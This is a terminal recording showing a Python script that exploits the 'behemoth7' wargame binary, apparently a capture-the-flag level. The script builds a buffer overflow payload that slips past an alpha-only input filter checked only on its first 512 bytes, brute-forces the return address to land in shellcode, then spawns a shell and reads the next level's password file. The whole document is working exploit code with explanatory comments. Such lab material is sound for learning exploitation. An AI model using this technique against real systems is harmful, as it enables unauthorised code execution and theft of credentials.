[0.363, "o", "cat /tmp/e_behemoth7.py\r\r\n\u001b[?2004l\r\u001b]3008;start=4914eb18-1efc-4eae-b870-bf8b5de598f4;type=command;machineid=ec21caf08cfdfe937b9cee1512c61281;user=behemoth7;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/home/behemoth7\u001b\\import os, struct, subprocess\r\r\n\r\r\n# behemoth7: main does\r\r\n#     strcpy(buf, argv[1]);                     // buf is 0x20c bytes below ebp\r\r\n# but BEFORE that it checks argv[1] character by character:\r\r\n#     for (i = 0; buf[i] && i <= 0x1ff; i++)\r\r\n#         if (!isalpha(buf[i]) && !isspace(buf[i])) { puts(\"Non-alpha...\"); exit(1); }\r\r\n# The check only looks at the FIRST 512 characters. Anything after that is copied\r\r\n# by strcpy without being inspected -- so we put 512 letters, then the saved EBP,\r\r\n# the return address, and the shellcode (which is full of non-alpha bytes).\r\r\n#\r\r\n# The shellcode was written in /tmp/b7.asm and assembled with nasm; we load the\r\r\n# exact bytes (/tmp/b7.bin).\r\r\nsc = open(\"/tmp/b7.bin\", \"rb\").read()\r\r\nprint(\"shellcode (%d bytes): %s\" % (len(sc), sc.hex()), flush=True)\r\r\nassert 0 not in sc, \"argv cannot contain a NUL byte\"\r\r\n\r\r\n# Layout of argv[1] (buf is at ebp-0x20c):\r\r\n#   [0..511]    512 alpha bytes that satisfy the filter\r\r\n#   [512..523]  12 more bytes to reach the saved EBP (buf+512..buf+523)\r\r\n#   [524..527]  saved EBP (filler)\r\r\n#   [528..531]  return address -> shellcode address\r\r\n#   [532..]     shellcode\r\r\ndef build(addr):\r\r\n    return b\"A\" * 512 + b\"A\" * 12 + b\"BBBB\" + struct.pack(\"<I\", addr) + sc\r\r\n\r\r\n# The addresses are ASLR-independent (ASLR is off) but depend on the environment\r\r\n# size, so we sweep 0xffffd000..0xffffe400 and stop on the PWN! marker that the\r\r\n# shellcode prints before it spawns the shell.\r\r\nprint(\"sweeping return addresses for the shellcode ...\", flush=True)\r\r\nfound = None\r\r\nfor addr in range(0xffffd000, 0xffffe400, 4):\r\r\n    p = build(addr)\r\r\n    if 0 in p:\r\r\n        continue\r\r\n    try:\r\r\n        r = subprocess.run([\"/behemoth/behemoth7\", p], capture_output=True,\r\r\n                           timeout=3, env={}, input=b\"\")\r\r\n    except subprocess.TimeoutExpired:\r\r\n        continue\r\r\n    if b\"PWN!\" in r.stdout:\r\r\n        found = addr\r\r\n        break\r\r\nprint(\"landed in the shellcode at %s\" % (hex(found) if found else \"NONE\"), flush=True)\r\r\nif found is None:\r\r\n    raise SystemExit(1)\r\r\n\r\r\n# Feed the shell the commands; it reads the same stdin pipe.\r\r\np = subprocess.Popen([\"/behemoth/behemoth7\", build(found)],\r\r\n                     stdin=subprocess.PIPE, stdout=subprocess.PIPE,\r\r\n                     stderr=subprocess.STDOUT, env={})\r\r\nout, _ = p.communicate(b\"id\\ncat /etc/behemoth_pass/behemoth8\\nexit\\n\", timeout=15)\r\r\nprint(out.decode(\"latin-1\"), flush=True)\r\r\nprint(\"B7\" + \"DONE\", flush=True)\r\r\n\r\r\n"]
